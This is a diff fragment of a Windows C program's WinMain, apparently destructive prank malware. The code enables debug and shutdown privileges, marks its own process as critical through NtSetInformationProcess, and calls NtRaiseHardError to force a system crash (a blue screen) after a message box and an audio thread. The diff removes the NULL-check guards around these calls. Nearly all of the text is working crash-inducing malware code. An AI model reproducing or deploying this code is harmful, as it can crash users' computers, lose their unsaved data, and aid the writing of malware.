@@ -55,16 +55,15 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     }
 
     HMODULE ntdll = LoadLibraryA("ntdll.dll");
-    if (ntdll != NULL) {
-       fnRtlAdjustPrivilege RtlAdjustPrivilege = (fnRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
-       fnNtRaiseHardError NtRaiseHardError = (fnNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
-       fnNtSetInformationProcess NtSetInformationProcess = (fnNtSetInformationProcess)GetProcAddress(ntdll, "NtSetInformationProcess");
+    fnRtlAdjustPrivilege RtlAdjustPrivilege = (fnRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
+    fnNtRaiseHardError NtRaiseHardError = (fnNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
+    fnNtSetInformationProcess NtSetInformationProcess = (fnNtSetInformationProcess)GetProcAddress(ntdll, "NtSetInformationProcess");
     
-       BOOLEAN bOld1;
-       ULONG ulBreakOnTermination1 = 1;
-       RtlAdjustPrivilege(20, TRUE, FALSE, &bOld1);
-       NtSetInformationProcess(GetCurrentProcess(), 0x1D, &ulBreakOnTermination1, sizeof(ULONG));
-    }
+    BOOLEAN bOld1;
+    ULONG ulBreakOnTermination1 = 1;
+    RtlAdjustPrivilege(20, TRUE, FALSE, &bOld1);
+    NtSetInformationProcess(GetCurrentProcess(), 0x1D, &ulBreakOnTermination1, sizeof(ULONG));
+
     MSGBOXPARAMS msglol = { 0 };
     msglol.cbSize = sizeof(MSGBOXPARAMS);
     msglol.hwndOwner = NULL;
@@ -216,12 +215,10 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     TerminateThread(hAudio, 1); //literally not safe
     CloseHandle(hAudio);
 
-    if (ntdll != NULL) {
-       BOOLEAN bOld2;
-       ULONG ulResponse;
-       RtlAdjustPrivilege(19, TRUE, FALSE, &bOld2);
-       NtRaiseHardError(0xC0000350, NULL, NULL, NULL, 6, &ulResponse);
-       FreeLibrary(ntdll);
-    }
+    BOOLEAN bOld2;
+    ULONG ulResponse;
+    RtlAdjustPrivilege(19, TRUE, FALSE, &bOld2);
+    NtRaiseHardError(0xC0000350, NULL, NULL, NULL, 6, &ulResponse);
+    FreeLibrary(ntdll);
     return 0;
 }
